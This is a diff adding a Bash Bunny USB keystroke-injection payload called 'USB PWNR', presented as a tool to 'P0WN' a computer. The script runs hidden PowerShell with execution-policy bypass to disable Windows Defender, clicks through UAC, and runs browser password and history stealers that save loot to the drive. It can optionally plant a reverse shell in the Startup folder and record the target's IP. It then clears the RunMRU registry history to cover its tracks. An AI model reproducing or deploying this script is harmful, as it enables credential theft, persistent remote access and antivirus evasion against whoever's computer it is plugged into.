@@ -1,0 +1,170 @@
+#!/bin/bash
+
+#USB PWNR
+#P0WNS a computer in seconds
+
+#CONFIGURATION BELOW!!!
+
+#Delay CONFIGURATION
+#Edit the lines below to change the standard delays in the script
+#SFD = Super Fast delay (waiting for CTRL v for example) FASTMODE(standard)=100 SLOWMODE=500
+SFD="100"
+#FD = Fast delay (waiting for CTRL v for example) FASTMODE(standard)=500 SLOWMODE=1000
+FD="500"
+#ND = Normal delay (waiting for programs to shut off) FASTMODE(standard)=1000 SLOWMODE=2000
+ND="1000"
+#LD = Long delay (waiting for programs to start or bash scipts to execute) FASTMODE(standard)=1500 SLOWMODE=3500
+LD="1500"
+
+#Reverse shell CONFIGURATION
+#Edit the line below to copy a reverse shell and execute it or not ("#" = Not copy/execute "" = do copy and execute)
+RS="#"
+
+#Reverse shell name CONFIGURATION
+name=servicehost.txt
+
+#Target ip CONFIGURATION
+#Edit the line below if you want to get the targets IP ("#" = Do not save target ip "" = save target ip)
+TP="#"
+
+#Shutting off CONFIGURATION
+#Edit the line below to shut the bunny off after finishing ("" = turn off / "#" = Do not turn off)
+AM="#"
+
+#Editing text below this line may prevent the script from working!
+
+#Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+GET TARGET_IP
+#Wait for the computer to recognise the drive etc
+Q delay $LD
+Q delay $LD
+Q delay $LD
+#Disable AntiVirus (Windows Defender)
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\disable-anti-virus.ps1')"
+#Bypass UAC
+Q DELAY $ND
+Q LEFT
+Q ENTER
+#Get drive letter and copy it:
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\GetDrive.ps1')"
+Q DELAY $ND
+
+#InfoGrabber
+LED STAGE1
+RUN WIN Powershell -nop -ex Bypass -w Hidden ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\run.ps1')"
+DELAY $LD
+
+#BPG (BrowserPasswordGrabber)
+LED STAGE2
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\pass.exe')"
+Q DELAY $LD
+Q CONTROL a
+Q DELAY $FD
+Q CONTROL s
+Q DELAY $FD
+Q STRING %computername% - Pass
+Q F4
+Q DELAY $SFD
+Q CONTROL a
+Q DELAY $SFD
+Q CONTROL v
+Q DELAY $SFD
+Q STRING 'loot\USB_PWNR'
+Q DELAY $SFD
+Q ENTER
+Q DELAY $FD
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY $SFD
+Q ALT F4
+
+#BHG (BrowserHistoryGrabber)
+LED STAGE 3
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\history.exe')"
+Q DELAY $LD
+Q ENTER
+Q DELAY $LD
+Q DELAY $LD
+Q CONTROL a
+Q DELAY $FD
+Q CONTROL s
+Q DELAY $FD
+Q STRING %computername% - History
+Q F4
+Q DELAY $SFD
+Q CONTROL a
+Q DELAY $SFD
+Q CONTROL v
+Q DELAY $SFD
+Q STRING 'loot\USB_PWNR'
+Q DELAY $SFD
+Q ENTER
+Q DELAY $FD
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q TAB
+Q ENTER
+Q DELAY $SFD
+Q ALT F4
+
+#Copy reverse shell file to shell:startup and start it
+LED STAGE4
+Q GUI r
+Q DELAY $SFD
+Q STRING powershell
+Q ENTER
+Q DELAY $FD
+$RS Q STRING copy
+$RS Q SPACE
+$RS Q DELAY $ND
+$RS Q CONTROL v
+$RS Q DELAY $FD
+$RS Q BACKSPACE
+$RS Q DELAY $FD
+$RS Q STRING "payloads\\"$name" 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+$RS Q ENTER
+$RS Q DELAY $FD
+$RS Q STRING "start 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"$name"\'"
+$RS Q DELAY $SFD
+$RS Q ENTER
+$RS Q DELAY $LD
+$RS Q DELAY $LD
+
+# Get Target IP
+$TP Q STRING cd
+$TP Q SPACE
+$TP Q CONTROL v
+$TP Q BACKSPACE
+$TP Q STRING '\loot'
+$TP Q ENTER
+$TP Q DELAY $SFD
+$TP Q STRING '$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address >>'
+$TP Q SPACE
+$TP Q CNTRL v
+$TP Q DELAY $SFD
+$TP Q BACKSPACE
+$TP Q STRING '\loot\USB_PWNR\ip.txt'
+$TP Q ENTER
+$TP Q DELAY $SFD
+Q STRING exit
+Q ENTER
+Q DELAY $SFD
+
+#Cleaning up fase
+LED CLEANUP
+RUN WIN powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+Q ENTER
+
+LED FINISH
+$AM ATTACKMODE OFF
